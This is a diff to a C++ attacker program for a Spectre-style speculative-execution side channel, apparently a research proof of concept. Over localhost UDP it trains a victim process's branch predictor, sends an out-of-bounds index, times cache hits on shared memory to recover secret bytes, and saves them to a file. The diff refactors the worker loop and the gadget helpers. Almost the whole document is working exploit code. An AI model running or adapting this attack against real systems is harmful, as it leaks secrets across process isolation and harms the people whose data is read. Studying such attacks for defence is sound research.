@@ -47,6 +47,13 @@
 #include "defines.h"
 #include "hex_util.h"
 
+/********************************************************************
+Attacker constants.
+********************************************************************/
+constexpr size_t PAGE_SIZE = 1<<12; // Assume 4KB page size (minimim)
+constexpr size_t MIN_MEASUREMENTS = 64; // Initital number of measurements/byte
+constexpr size_t TRAINING_BURST = 7;  // Valid messages to train Victim BP
+
 
 /********************************************************************
 Attacker globals.
@@ -62,32 +69,31 @@ uint64_t target_va;          // VM Address of target in victim
 
 std::string secret;   // Bucket for stolen secret/s...
 
+/* UDP ocket onnection to Victim */
+uint16_t udp_port = 7777;
+std::string ipv4_addr("127.0.0.1");
+
 
 /********************************************************************
-Victim shared-memory (mapped into attacker).
+Victim shared-memory (mapped into Attacker as read-only pages).
 ********************************************************************/
 region* sm_ptr;
-const uint8_t* array2;
+const uint8_t* array2;  // pointer to begining of array2 in region
 
 
 /********************************************************************
-Analysis code
+Attacker observability: side-channel measurement
 ********************************************************************/
-constexpr size_t PAGE_SIZE = 1<<12; // Assume 4KB page size (minimim)
-
 /* Default to a cache hit threshold of 80 */
 uint64_t cache_hit_threshold = 100;
-constexpr size_t MIN_MEASUREMENTS = 64;
 
+// Accurate Latencies: save delay in cycles for each measurement
+// - Useful for debugging, but too heavy for reliable hit measurements.
 //#define ACCURATE_LATENCIES
 #ifdef ACCURATE_LATENCIES
 std::vector< std::array<uint16_t,256> > latency_ts;  // timeseries of access latencies
 #endif
 std::vector< std::bitset<256> > hit_ts;  // timeseries of line hits
-
-/* Other global (optional) parameters */
-uint16_t udp_port = 7777;
-std::string ipv4_addr("127.0.0.1");
 
 #ifdef NOCLFLUSH
 #define CACHE_FLUSH_ITERATIONS 2048
@@ -128,28 +134,6 @@ inline void flush_array2() {
     _mm_mfence();
 #else
     for (volatile int z = 0; z < 100; z++) {}
-#endif
-}
-
-
-// TODO: Currently this is being done by the victim.  Need to rework...
-inline void gadget_flush_condition() {
-  constexpr auto WAYS = 2048; // TODO: Make this more precise!
-  constexpr auto STRIDE = PAGE_SIZE;
-  uint8_t cache_flush_array[PAGE_SIZE * WAYS];
-
-  /* Alternative to using clflush to flush the CPU cache */
-  /* Read addresses at 4096-byte intervals out of a large array.
-     Do this around 2000 times, or more depending on CPU cache size. */
-  for(int l = WAYS * PAGE_SIZE - 1; l >= 0; l -= PAGE_SIZE) {
-    cache_flush_array[l] ^= target_x_offset;
-  }
-
-      /* Delay (can also mfence) */
-#ifndef NOMFENCE
-  _mm_mfence();
-#else
-  for (volatile int z = 0; z < 100; z++) {}
 #endif
 }
 
@@ -219,6 +203,94 @@ void measure_sidechannel(size_t iteration) {
 #ifdef ACCURATE_LATENCIES
     latency_ts[iteration][mix_i] = time2;
 #endif
+  }
+}
+
+
+/********************************************************************
+UDP socket functions: Victim gadgets potentially leveraged by Attacker.
+********************************************************************/
+// Not unreasonable to have means of asking the Victim' process to perform
+// a function which touches the secret for TLB locality.
+// - i.e. new client connection and authentication.
+inline void gadget_touch_secret(SocketUDP& s, size_t x) {
+  // Send a single request with a malicious request:
+  // Initialize target x to send to victim:
+  msg m = {};
+  m.x = x;
+  m.fn = FN_TOUCH_SECRET;
+
+  // Send a request which executes the touch secret gadget within victim:
+  auto bytes = s.send(&m, sizeof(m));
+  if ( unlikely(!(bytes > 0)) ) {
+    std::cerr << "Failed to send FN_TOUCH_SECRET!" << std::endl;
+  }
+}
+
+// A bit more unreasonable to assume the Victim's process can touch any
+// allocated page.
+// - A secret worth stealing is likely touched at some point or another.
+inline void gadget_touch_page(SocketUDP& s, size_t x) {
+  // Send a single request with a malicious request:
+  // Initialize target x to send to victim:
+  msg m = {};
+  m.x = x;
+  m.fn = FN_TOUCH_PAGE;
+
+  // Send a request which executes the touch page gadget within victim:
+  auto bytes = s.send(&m, sizeof(m));
+  if ( unlikely(!(bytes > 0)) ) {
+    std::cerr << "Failed to send FN_TOUCH_PAGE!" << std::endl;
+  }
+}
+
+
+// TODO: Currently this is being done by the victim.  Need to rework...
+inline void gadget_evict_condition(SocketUDP& s) {
+  // Send a single request with a malicious request:
+  // Initialize target x to send to victim:
+  msg m = {};
+  m.fn = FN_EVICT_CONDITION;
+
+  // Send a burst of 5 training (valid) requests:
+  auto bytes = s.send(&m, sizeof(m));
+  if ( unlikely(!(bytes > 0)) ) {
+    std::cerr << "Failed to send FN_TOUCH_SECRET!" << std::endl;
+  }
+}
+
+
+/********************************************************************
+UDP socket functions: Attacker helper functions for Victim controllability.
+********************************************************************/
+// Initiates a burst of branch predictor training messages to Victim:
+inline void burst_train(SocketUDP& s, size_t training_x = 0) {
+  // Initialize target x to send to victim:
+  msg m = {};
+  m.x = training_x;
+  m.fn = FN_PROCESS;
+
+  // Send a burst of 5 training (valid) requests:
+  for (size_t i = 0; i < TRAINING_BURST; i++) {
+    auto bytes = s.send(&m, sizeof(m));
+    if ( unlikely(!(bytes > 0)) ) {
+      std::cerr << "Failed to send training_x!" << std::endl;
+    }
+  }
+}
+
+
+inline void speculate(SocketUDP& s, size_t malicious_x) {
+  // Send a single request with a malicious request:
+  // Initialize target x to send to victim:
+  msg m = {};
+  m.x = malicious_x;
+  m.fn = FN_PROCESS;
+
+  // Send a burst of 5 training (valid) requests:
+  auto bytes = s.send(&m, sizeof(m));
+  if ( unlikely(!(bytes > 0)) ) {
+    std::cerr << "Failed to send malicious_x!" << std::endl;
   }
 }
 
@@ -307,12 +379,10 @@ void parse_args(int argc, char* const argv[]) {
       exit(EXIT_SUCCESS);
       break;
     case 't':  // Victim's secret VA address (size_t)
-//      target_va = static_cast<uint64_t>(atoll(optarg));
       target_va = convert_to_int<uint64_t>(optarg);
       found_target_va = true;
       break;
     case 'a': // Victim's array1 VA address (size_t)
-//      target_array1_va = static_cast<uint64_t>(atoll(optarg));
       target_array1_va = convert_to_int<uint64_t>(optarg);
       found_array1_va = true;
       break;
@@ -359,266 +429,35 @@ void parse_args(int argc, char* const argv[]) {
 }
 
 
-template <typename T>
-std::vector<size_t> sort_indexes(const T& v) {
-  // Create index vector of identical size to vector v:
-  std::vector<size_t> idx(v.size());
-  std::iota(idx.begin(), idx.end(), 0);
-
-  // Sort index vector based on values in v:
-  std::sort(idx.begin(), idx.end(),
-            [&v](size_t i1, size_t i2) {return v[i1] > v[i2];});
-
-  return idx;
-}
-
-
-
 /********************************************************************
-UDP socket functions.
+Attacker controllability thread and helper-functions.
 ********************************************************************/
-void send_worker(uint16_t port) {
-  // Socket initialization:
-  uint8_t buf[2048];
-  SocketUDP s;
-  assert(s.setRemote(ipv4_addr, port) == 0);
-  std::cout << "["<<port<<"] - Sender worker thread listening." << std::endl;
+// TODO: Currently handled by gadget_evict_condition.
+// - Need a means of dynamically detecting which cache line the Victim's
+//   array1_size is mapped to.
+// - Ensure this cache line is blown out by Attacker thread prior to speculate()
+inline void flush_condition() {
+  constexpr auto WAYS = 2048; // TODO: Make this more precise!
+  constexpr auto STRIDE = PAGE_SIZE;
+  uint8_t cache_flush_array[PAGE_SIZE * WAYS];
 
-  constexpr size_t MIN_MEASUREMENTS = 64;
-  size_t measurements = MIN_MEASUREMENTS;
-  secret.resize(target_len);
-
-  // Initialize target x to send to victim:
-  msg m = {};
-  m.x = target_x_offset;
-
-  size_t tries = 0;
-  for (;;) {
-//#define INTERACTIVE
-#ifdef INTERACTIVE
-    std::string in;
-    std::cout << "Ready to send?" << std::endl;
-    std::cin >> in;
-    if (in.at(0) == 'n') {
-      if (++m.x >= (target_x_offset + target_len)) {
-        break;  // break out of forever loop.
-      }
-    }
-#endif
-
-    // Timeseries intialization:
-    // - reservation avoids memory allocation during side-channel anaylsis.
-    hit_ts.resize(measurements); // Pre-allocate measurement space on heap!
-#ifdef ACCURATE_LATENCIES
-    latency_ts.resize(measurements);
-#endif
-
-
-    // Repeat attack 100 times / byte:
-    // - TODO: replace with a dynamic confidence mechanism?...
-    while (++tries % measurements != 0) {
-      const auto attempt = tries-1;
-
-      // Ensure side-channel array is uncached:
-      flush_array2(); // Does this work on read-only shared memory?...
-
-      // Send request to victim:
-      auto bytes = s.send(&m, sizeof(m));
-      if (bytes > 0) {
-        bytes = s.recv(buf, sizeof(buf));
-        measure_sidechannel(attempt);
-
-        assert(bytes == sizeof(msg)); // TODO: maybe just skip if receive a weird packet?
-        const msg& reply = reinterpret_cast<msg&>(buf);
-        const auto training_x = reply.x + 1;  // FIXME: not sure why off by one...
-
-//#define DEBUG
-#ifdef DEBUG
-        std::cout << "training_x: "<< training_x << std::endl;
-        auto hits_idx = sort_indexes(hit_ts.at(attempt));
-        for (size_t idx : hits_idx) {
-#ifdef ACCURATE_LATENCIES
-          const auto hit = latency_ts.at(attempt).at(idx);
-#endif
-          if (!hit_ts.at(attempt).test(idx)) { break; }
-          std::cout << "Byte["<<idx<<"] (" << static_cast<char>(idx) << ")"
-#ifdef ACCURATE_LATENCIES
-                    << ": " << hit << " cycles."
-#endif
-                    << std::endl;
-        }
-#endif
-
-        // Omit training_x used from measurement:
-        hit_ts.at(attempt).reset(training_x);
-#ifdef ACCURATE_LATENCIES
-        latency_ts.at(attempt).at(training_x) = std::numeric_limits<uint8_t>::max();
-#endif
-      }
-      else {
-        std::cerr <<"["<<port<<"]- Something went wrong on send..." <<std::endl;
-        break;
-      }
-    }
-
-
-    // Summarize measurements:
-    std::valarray<uint64_t> counts(uint64_t(0), 256);
-    for (size_t b = 0; b < counts.size(); b++) {
-      // for each measurement, count all bits set:
-      for (size_t t = 0; t < tries; t++) {
-        if (hit_ts[t].test(b)) {
-          counts[b]++;
-        }
-      }
-    }
-    // Output results from attack:
-#ifdef DEBUG
-    std::cout << "Results for target_x_offset: " << m.x << '\n';
-#endif
-    auto counts_idx = sort_indexes(counts);
-    for (size_t idx : counts_idx) {
-      const auto hits = counts[idx];
-      if (hits == 0) { break; }
-#ifdef DEBUG
-      std::cout << "Byte["<<idx<<"] (" << static_cast<char>(idx) << "): "
-                << hits << " hits." << std::endl;
-#endif
-    }
-
-    // Dynamic confidence adjustment:
-    auto sum = counts.sum();
-    auto min = counts.min();
-    auto max = counts.max();
-
-    bool single_contender = (sum == max) && sum >= 4;  // picked threshold 4 out of a hat.
-    bool significant = (sum - max) < (sum/4) && sum >= 16;  // picked noise threshold 4x out of a hat.
-    bool confident = single_contender || significant;
-    if (!confident) {
-      // Retry, doubling the number of measurments:
-      measurements *= 2;
-    }
-    else {
-      // Pick the byte with the highest hits:
-      auto idx = counts_idx.at(0);
-      secret.at(m.x - target_x_offset) = idx;
-
-      // Output statistics:
-      float confidence = (float(max) / float(sum)) * 100;
-      float observability = (float(max) / measurements) * 100;
-      std::cout << "Offset["<<m.x<<"] (" << idx << " : "
-                << static_cast<char>(idx) << "): "
-                << max << '/' << sum << " hits with confidence "
-                << confidence << "%.\n";
-      std::cout << "- Observability: " << observability << "% over "
-                << measurements << " measurements." << std::endl;
-
-      // Reset measurements:
-      tries = 0;
-      measurements = MIN_MEASUREMENTS;
-      hit_ts.clear();
-#ifdef ACCURATE_LATENCIES
-      latency_ts.clear();
-#endif
-
-#ifndef INTERACTIVE
-      if (++m.x >= (target_x_offset + target_len)) {
-        break;  // break out of forever loop.
-      }
-#endif
-    }
+  /* Alternative to using clflush to flush the CPU cache */
+  /* Read addresses at 4096-byte intervals out of a large array.
+     Do this around 2000 times, or more depending on CPU cache size. */
+  for(int l = WAYS * PAGE_SIZE - 1; l >= 0; l -= PAGE_SIZE) {
+    cache_flush_array[l] ^= target_x_offset;
   }
 
-  // Print out secret:
-  std::cout << "Finished reading " << target_len
-            << " bytes at offset " << target_x_offset << ":\n"
-            << make_printable(secret) << std::endl;
+      /* Delay (can also mfence) */
+#ifndef NOMFENCE
+  _mm_mfence();
+#else
+  for (volatile int z = 0; z < 100; z++) {}
+#endif
 }
 
 
-inline void burst_train(SocketUDP& s, size_t training_x = 0) {
-  constexpr size_t BURST_COUNT = 7;
-
-  // Initialize target x to send to victim:
-  msg m = {};
-  m.x = training_x;
-  m.fn = FN_PROCESS;
-
-  // Send a burst of 5 training (valid) requests:
-  for (size_t i = 0; i < BURST_COUNT; i++) {
-    auto bytes = s.send(&m, sizeof(m));
-    if ( unlikely(!(bytes > 0)) ) {
-      // buffer/send error?
-      std::cerr << "Failed to send training_x!" << std::endl;
-    }
-  }
-}
-
-
-inline void speculate(SocketUDP& s, size_t malicious_x) {
-  // Send a single request with a malicious request:
-  // Initialize target x to send to victim:
-  msg m = {};
-  m.x = malicious_x;
-  m.fn = FN_PROCESS;
-
-  // Send a burst of 5 training (valid) requests:
-  auto bytes = s.send(&m, sizeof(m));
-  if ( unlikely(!(bytes > 0)) ) {
-    // buffer/send error?
-    std::cerr << "Failed to send malicious_x!" << std::endl;
-  }
-}
-
-
-inline void gadget_touch_secret(SocketUDP& s, size_t x) {
-  // Send a single request with a malicious request:
-  // Initialize target x to send to victim:
-  msg m = {};
-  m.x = x;
-  m.fn = FN_TOUCH_SECRET;
-
-  // Send a request which executes the touch secret gadget within victim:
-  auto bytes = s.send(&m, sizeof(m));
-  if ( unlikely(!(bytes > 0)) ) {
-    // buffer/send error?
-    std::cerr << "Failed to send FN_TOUCH_SECRET!" << std::endl;
-  }
-}
-
-
-inline void gadget_touch_page(SocketUDP& s, size_t x) {
-  // Send a single request with a malicious request:
-  // Initialize target x to send to victim:
-  msg m = {};
-  m.x = x;
-  m.fn = FN_TOUCH_PAGE;
-
-  // Send a request which executes the touch page gadget within victim:
-  auto bytes = s.send(&m, sizeof(m));
-  if ( unlikely(!(bytes > 0)) ) {
-    // buffer/send error?
-    std::cerr << "Failed to send FN_TOUCH_PAGE!" << std::endl;
-  }
-}
-
-
-inline void gadget_evict_condition(SocketUDP& s) {
-  // Send a single request with a malicious request:
-  // Initialize target x to send to victim:
-  msg m = {};
-  m.fn = FN_EVICT_CONDITION;
-
-  // Send a burst of 5 training (valid) requests:
-  auto bytes = s.send(&m, sizeof(m));
-  if ( unlikely(!(bytes > 0)) ) {
-    // buffer/send error?
-    std::cerr << "Failed to send FN_TOUCH_SECRET!" << std::endl;
-  }
-}
-
-
-void send_worker_v2(uint16_t port) {
+void attacker_worker(uint16_t port) {
   // Socket initialization:
   uint8_t buf[2048];   // TODO: move this to SocketUDP?
   SocketUDP s;
@@ -628,8 +467,7 @@ void send_worker_v2(uint16_t port) {
   size_t measurements = MIN_MEASUREMENTS;
   secret.resize(target_len);
 
-  constexpr size_t TRAINING_X_MIN = 0;
-  constexpr size_t TRAINING_X_MAX = 16;  // dependant on victim...
+  constexpr size_t TRAINING_X_MAX = 16;  // dependant on victim safe input range
 
   // Next target x to send to victim:
   size_t malicious_x = target_x_offset;
@@ -647,7 +485,6 @@ void send_worker_v2(uint16_t port) {
 
 
     // Repeat attack 100 times / byte:
-    // - TODO: replace with a dynamic confidence mechanism?...
     while (++tries % measurements != 0) {
       const auto attempt = tries-1;
       const size_t training_x = attempt % TRAINING_X_MAX;
@@ -659,12 +496,6 @@ void send_worker_v2(uint16_t port) {
       burst_train(s, training_x); // Critical to trick speculation down wrong path!
       gadget_evict_condition(s);  // Critical to cause speculation while waiting for memory!
       speculate(s, malicious_x);
-
-      // Wait some amount of time (or for server reply -- but may be too slow):
-//      const auto INITIAL_DELAY = std::chrono::microseconds(5);
-//      std::this_thread::sleep_for(INITIAL_DELAY);
-//      std::this_thread::sleep_for(std::chrono::nanoseconds(10));
-//      std::this_thread::yield();  // yield one sheduler tick (~100 us)
 
       // Measure speculative execution's impact on cache:
       // - measure after a predefined delay (or after event e.g. packet recv.)
@@ -705,7 +536,7 @@ void send_worker_v2(uint16_t port) {
 
       // Omit training_x used from measurement:
       // TODO: still don't understand why lines are consistantly off by 1...
-      // expected training_x cache line is actaully training_x+1
+      //  expected training_x cache line is actaully training_x+1
       const auto misaligned_x = training_x+1;  // FIXME...
 #ifdef DEBUG
       assert(hit_ts.at(attempt).test(misaligned_x));  // not guaranteed, but often true
@@ -718,7 +549,6 @@ void send_worker_v2(uint16_t port) {
 
 
     // Summarize measurements:
-//    std::valarray<uint64_t> counts(uint64_t(0), 256);
     std::vector<uint64_t> counts(256, uint64_t(0));
     for (size_t b = 0; b < counts.size(); b++) {
       // for each measurement, count all bits set:
@@ -752,7 +582,7 @@ void send_worker_v2(uint16_t port) {
     bool single_contender = sum == best && sum >= 4;
     // Is there a majority leader?  (picked signal threshold 2x, out of a hat)
     bool significant = best >= (second/2) && sum >= 64;
-    // Are we suspicious of Intel's Zero-value predicition on minor page fault?
+    // Suspicious of Intel's Zero-value predicition on minor page fault?
     bool zero_value_prediciton = (counts_idx[0] == 0) &&
                                  (sum <= 4*MIN_MEASUREMENTS);
 
@@ -825,7 +655,6 @@ void send_worker_v2(uint16_t port) {
 }
 
 
-
 /********************************************************************
 Main.
 *********************************************************************
@@ -857,10 +686,10 @@ int main(int argc, char* const argv[]) {
   CPU_ZERO(&cpuset);
   CPU_SET(1, &cpuset);
 
-  std::thread t(send_worker_v2, udp_port);
+  std::thread t(attacker_worker, udp_port);
 
   // Pin attacker thread to the same core as victim (optional):
-  // - Help prevent kernel scheduler from messing up cache locality between runs
+  // - Help prevent kernel scheduler from messing up cache/tlb locality.
   int rc = pthread_setaffinity_np(t.native_handle(), sizeof(cpuset), &cpuset);
   if (rc != 0) {
     std::cerr << "Error calling pthread_setaffinity_np: " << rc << "\n";
@@ -868,7 +697,7 @@ int main(int argc, char* const argv[]) {
   t.join(); // wait until exits for now...
 
 
-  // Save discovered secret to file:
+  // Write discovered secret to file:
   assert(secret.size() > 0);
   std::stringstream fn_ss;
   fn_ss << "secret." << target_x_offset << ".bin";
@@ -878,9 +707,10 @@ int main(int argc, char* const argv[]) {
   if (!f.is_open()) {
     std::cerr << "Error opening file for writing...";
   }
-//  f << secret;
   f.write(secret.c_str(), secret.size());
   f.close();
+
+  std::cout << "Secret written to file: " << fn_ss.str() << std::endl;
 
   return EXIT_SUCCESS;
 }
